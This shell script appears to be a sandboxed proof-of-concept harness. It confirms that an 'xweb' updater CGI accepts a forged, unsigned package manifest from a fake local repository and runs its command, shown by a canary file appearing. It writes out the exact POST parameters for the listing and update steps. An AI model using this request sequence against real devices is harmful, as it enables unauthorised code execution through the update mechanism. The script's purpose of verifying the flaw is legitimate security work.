#!/bin/sh
# Forged-update canary validation against the genuine x86 5.8.8 new_xwrpm.cgi.
# Everything runs loopback-only inside the disposable bubblewrap sandbox; the
# only command the fabricated manifest executes is touching a unique canary.
# Inputs (set by the launcher): FORGED_CANARY, FORGED_SSES.
set -u

CANARY=${FORGED_CANARY:?FORGED_CANARY not set}
SSES=${FORGED_SSES:?FORGED_SSES not set}
CGI=/opt/xweb/www/cgi-bin/new_xwrpm.cgi
REPO_PORT=18089
HTTPD_PID=
FAILURES=0

cleanup() {
  set +e
  /bin/rm -f "$CANARY" /tmp/update_lock 2>/dev/null
  /bin/rm -f "/dev/shm/usp_$SSES" 2>/dev/null
  /bin/busybox rm -rf /opt/tmp/upl 2>/dev/null
  if [ -n "$HTTPD_PID" ]; then
    kill "$HTTPD_PID" 2>/dev/null
    wait "$HTTPD_PID" 2>/dev/null
  fi
}
trap cleanup EXIT INT TERM

fail() { echo "FAIL $*"; FAILURES=$((FAILURES + 1)); }

run_cgi() {
  _body="$1"
  /bin/rm -f /tmp/update_lock 2>/dev/null
  _len=$(/bin/busybox printf '%s' "$_body" | /bin/busybox wc -c)
  /bin/busybox printf '%s' "$_body" | \
    REQUEST_METHOD=POST CONTENT_LENGTH="$_len" \
    CONTENT_TYPE=application/x-www-form-urlencoded \
    /usr/bin/qemu-i386 -L / "$CGI" 2>&1
}

echo "== 0. reset state =="
cleanup
/bin/busybox mkdir -p /opt/tmp/upl
[ ! -e "$CANARY" ] || fail "canary already present before test"

echo "== 1. no-session negative control =="
CONTROL=$(run_cgi "gu=0&server=127.0.0.1:$REPO_PORT&path=/")
case "$CONTROL" in
  *CanaryPkg*) fail "updater listed the forged package without a session" ;;
  *) echo "PASS no-session request rejected: $(echo "$CONTROL" | /bin/busybox tail -1)" ;;
esac
[ ! -e "$CANARY" ] || fail "canary created without a session"

echo "== 2. session file (same role as a logged-in web session) =="
/usr/bin/touch "/dev/shm/usp_$SSES"

echo "== 3. start loopback fake repository =="
/bin/busybox httpd -p "127.0.0.1:$REPO_PORT" -h /fake-repo &
HTTPD_PID=$!
/bin/busybox sleep 1

echo "== 4. gu=0 repository listing (POST) =="
LISTING=$(run_cgi "gu=0&server=127.0.0.1:$REPO_PORT&path=/&SSES=$SSES")
echo "$LISTING" | /bin/busybox tail -2
case "$LISTING" in
  *CanaryPkg*'"err":0}'*) echo "PASS forged unsigned manifest listed as a valid package" ;;
  *) fail "forged manifest not listed" ;;
esac

echo "== 5. mu=10 repository update (POST) =="
UPDATE=$(run_cgi "mu=10&dv=-&ph=/&u=labcheck&ln=en&SSES=$SSES")
echo "$UPDATE" | /bin/busybox tail -2
case "$UPDATE" in
  *CanaryPkg*'"err":0}'*) echo "PASS forged unsigned payload accepted for update" ;;
  *) fail "forged payload not accepted" ;;
esac

echo "== 6. canary check =="
if [ -f "$CANARY" ]; then
  echo "PASS updater executed the forged manifest command (canary present)"
else
  fail "canary missing; manifest command not executed"
fi

echo "== 7. cleanup verification =="
/bin/rm -f "$CANARY"
/bin/rm -f "/dev/shm/usp_$SSES"
/bin/busybox rm -rf /opt/tmp/upl
[ ! -e "$CANARY" ] || fail "canary not removed"
[ ! -e "/dev/shm/usp_$SSES" ] || fail "session file not removed"
[ ! -e /opt/tmp/upl ] || fail "update staging dir not removed"
echo "PASS canary, session file, and staging dir removed"

echo "failures: $FAILURES"
if [ "$FAILURES" -eq 0 ]; then
  echo "overall: PASS"
else
  echo "overall: FAIL"
  exit 1
fi
